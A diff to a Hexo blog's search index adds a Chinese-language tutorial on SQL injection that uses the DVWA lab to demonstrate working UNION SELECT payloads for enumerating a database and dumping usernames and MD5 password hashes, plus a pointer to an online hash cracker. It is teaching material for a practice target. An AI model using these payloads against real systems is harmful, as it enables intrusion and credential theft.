@@ -48,4 +48,77 @@ hexo help             # 帮助</p>
         <tag>hexo</tag>
       </tags>
   </entry>
+  <entry>
+    <title>sql注入</title>
+    <url>/2022/03/25/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1>一.SQL注入简介</h1>
+<p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p>
+<h1>二.sql注入漏洞详解</h1>
+<h2 id="Sql-注入带来的威胁主要有如下几点">Sql 注入带来的威胁主要有如下几点</h2>
+<ul>
+<li>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。</li>
+<li>绕过认证，列如绕过验证登录网站后台。</li>
+<li>注入可以借助数据库的存储过程进行提权等操作</li>
+</ul>
+<h2 id="Sql-注入示例一-猜解数据库">Sql 注入示例一.猜解数据库</h2>
+<p>​      使用DVWA渗透测试平台，作为攻击测试的目标：</p>
+<p><img src="/.io//1.png" alt="1"></p>
+<p>先输入 1 ，查看回显 (URL中ID=1，说明php页面通过get方法传递参数)：</p>
+<p>那实际上后台执行了什么样的Sql语句呢？点击 <code>view source</code>查看源代码 ，其中的SQL查询代码为：</p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;’</p>
+<p>Spl执行语句为上句。</p>
+<p>我们是通过控制参数Id的值来返回我们需要的信息。</p>
+<p>如果我们不按常理出牌，比如在输入框中输入 <code>1' order by 1#</code><br>
+实际执行的Sql语句就会变成:</p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ order by 1#`;</p>
+<p>这条语句的意思是查询users表中user_id为1的数据并按第一字段排行。</p>
+<p>输入 <code>1' order by 1#</code>和 <code>1' order by 2#</code>时都返回正常：</p>
+<img src="/.io//hexo-blog\source\_posts\SQL注入\3.png">
+<p>由此可知，user表中只有两个字段，数据为两列。</p>
+<p>接下来我们使用 union select联合查询继续获取信息。<br>
+union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同，而我们之前已经知道了主查询列数为 2，接下来就好办了。<br>
+输入1’ union select database(),user()#进行查询 ：</p>
+<p>database()将会返回当前网站所使用的数据库名字.<br>
+user()将会返回执行当前查询的用户名.</p>
+<p>实际执行的Sql语句是 :</p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select database(),user()#`;</p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%5C4.png" alt=""></p>
+<p>通过上图返回信息，我们成功获取到：</p>
+<ul>
+<li>当前网站使用数据库为 dvwa .</li>
+<li>当前执行查询用户名为 root@localhost .</li>
+</ul>
+<p>同理我们再输入 <code>1' union select version(),@@version_compile_os#</code>进行查询：</p>
+<ul>
+<li>version() 获取当前数据库版本.</li>
+<li>@@version_compile_os 获取当前操作系统。</li>
+</ul>
+<p>实际执行的Sql语句是:</p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select version(),@@version_compile_os#`;</p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%5C5png.png" alt=""></p>
+<p>通过上图返回信息，我们又成功获取到：</p>
+<p>当前数据库版本为 : 5.6.31-0ubuntu0.15.10.1.<br>
+当前操作系统为 : debian-linux-gnu<br>
+接下来我们尝试获取 dvwa 数据库中的表名。<br>
+information_schema 是 mysql 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
+<p>我们输入<code>1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#</code>进行查询：<br>
+实际执行的Sql语句是：</p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select table_name,table_schema from information_schema.tables where table_schema= ‘dvwa’#`;</p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%5C6.png" alt=""></p>
+<p>通过上图返回信息，我们再获取到：</p>
+<p>dvwa 数据库有两个数据表，分别是 guestbook 和 users .</p>
+<p>我们接下来获取用户名和密码。</p>
+<p>我们可以大胆猜测users表的字段为 user 和 password ，所以输入：<code>1' union select user,password from users#</code>进行查询：<br>
+实际执行的 Sql 语句是：</p>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select user,password from users#`;</p>
+<p>可以看到成功爆出用户名、密码，密码采用 md5 进行加密，可以到<code>www.cmd5.com</code>进行解密。<br>
+我们已经对 Sql 注入有了一个大概得了解，也清楚了 Sql 注入的强大。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
 </search>
